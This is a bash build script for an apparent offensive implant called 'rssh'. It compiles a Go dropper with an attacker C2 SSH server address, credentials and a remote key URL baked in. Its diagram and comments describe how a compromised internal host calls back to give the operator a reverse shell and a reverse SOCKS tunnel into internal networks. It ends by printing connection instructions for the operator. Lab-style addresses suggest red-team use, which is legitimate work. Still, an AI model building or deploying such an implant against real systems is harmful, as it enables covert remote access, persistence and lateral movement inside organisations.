#!/bin/bash

# [Organization]  ----- |Internet| ------ [Attacker C2]
#
#      (Dropper)  ------ Call back ------> SSH Server -------------------|
#                                                                        |  Attacker SSH shell client
# 1. Internal Host <==== SSH Client <= Reverse Shell ==== SSH Server ----|
#                                                                        |  Attacker Browser+SOCKS
# 2. Internal Hosts N <==== SSH Client <= Reverse SOCKS ==== SSH Server -|
#    Internal Hosts N+1

# SSH SSHServer (host)
SSHServerHost=172.16.56.230

# SSH SSHServer (port)
SSHServerPort=22

# Attacker Implant SSH account
SSHServerUser=tester

# Implant SSH key
SSHServerUserKeyUrl="http://127.0.0.1:9000/id_rsa_test_enc"

# Implant SSH password (wire)
# TODO: need to decide if wire protection on a non-passphrased key is ok, or need passphrase on the key itself
SSHServerUserKeyPassphrase=password1

# Channel IP for reverse tunnel (addr)
SSHRemoteCmdHost=127.0.0.1

# Channel IP for reverse tunnel (port)
SSHRemoteCmdPort=2022

# Channel IP for reverse tunnel SOCKS (addr)
SSHRemoteSocksHost=127.0.0.1

# Channel IP for reverse tunnel SOCKS (port)
SSHRemoteSocksPort=1080

# Operator Implant logon (user)
SSHRemoteCmdUser=operator

# Operator Implant logon (password)
# TODO: Randomize
SSHRemoteCmdPwd=$( date | shasum | cut -d" " -f1)

#--------------- Transport ------------------#
# HTTP/S proxy:
HTTPProxy="http://127.0.0.1:8088"

# WS/WSS endpoint:
HTTPEndpoint="http://127.0.0.1:8080"

# WS/WSS endpoint:
WSEndpoint="wss://127.0.0.1:8080/stream"

# Implant Exe name
dropperName="rssh"

echo "[*] Building dropper"
go build -ldflags \
	"-s -w \
     -X main.SSHServerPort=${SSHServerPort}  \
     -X main.SSHServerHost=${SSHServerHost} \
     -X main.SSHServerUser=${SSHServerUser} \
     -X main.SSHServerUserKeyUrl=${SSHServerUserKeyUrl} \
     -X main.SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase} \
     -X main.SSHRemoteCmdHost=${SSHRemoteCmdHost}  \
     -X main.SSHRemoteCmdPort=${SSHRemoteCmdPort} \
     -X main.SSHRemoteCmdUser=${SSHRemoteCmdUser} \
     -X main.SSHRemoteCmdPwd=${SSHRemoteCmdPwd} \
     -X main.SSHRemoteSocksHost=${SSHRemoteSocksHost} \
     -X main.SSHRemoteSocksPort=${SSHRemoteSocksPort} \
     -X main.HTTPProxy=${HTTPProxy} \
     -X main.HTTPEndpoint=${HTTPEndpoint} \
     -X main.WSEndpoint=${WSEndpoint}" \
     -o ${dropperName} ./rssh.go \
     ./types.go ./vars.go ./Pty.go ./socksport.go ./keymgmt.go ./traffic.go

if [[ $? -eq 0 ]]
then
    echo "[*] Dropper Information (keep it safe):"
    printf "    %s\n" "#######################"
    printf "    %s\n" "Dropper File: ${dropperName} ($(stat -f '%z bytes' ${dropperName}))"
    printf "    %s\n" "SSH SSHServerHost=${SSHServerHost}"
    printf "    %s\n" "SSH SSHServerPort=${SSHServerPort}"
    printf "    %s\n" "SSH SSHServerUser=${SSHServerUser}"
    printf "    %s\n" "SSH SSHServerUserKeyUrl=${SSHServerUserKeyUrl}"
    printf "    %s\n" "SSH SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase}"
    printf "    %s\n" "SSH-RT SSHRemoteCmdHost=${SSHRemoteCmdHost}"
    printf "    %s\n" "SSH-RT SSHRemoteCmdPort=${SSHRemoteCmdPort}"
    printf "    %s\n" "SSH-RT SSHRemoteCmdUser=${SSHRemoteCmdUser}"
    printf "    %s\n" "SSH-RT SSHRemoteCmdPwd=${SSHRemoteCmdPwd}"
    printf "    %s\n" "SSH-RTS SSHRemoteSocksHost=${SSHRemoteSocksHost}"
    printf "    %s\n" "SSH-RTS SSHRemoteSocksPort=${SSHRemoteSocksPort}"
    printf "    %s\n" "SSH-RT shell agent password: ${SSHRemoteCmdPwd} "
    printf "    %s\n" "HTTP Proxy: ${HTTPProxy} "
    printf "    %s\n" "HTTP Endpoint: ${HTTPEndpoint} "
    printf "    %s\n" "WS Endpoint: ${WSEndpoint} "
    printf "    %s\n" "#######################"
    printf "\n    %s\n" "   Usage SSH-RT: ssh ${SSHRemoteCmdUser}@${SSHRemoteCmdHost} -p ${SSHRemoteCmdPort} "
    printf "    %s\n" "   Usage SSH-RTS: browser SOCKS proxy: ${SSHRemoteSocksHost}:${SSHRemoteSocksPort} "
fi


# upx --brute ./rssh
# 7.1 vs. 1.7 mb
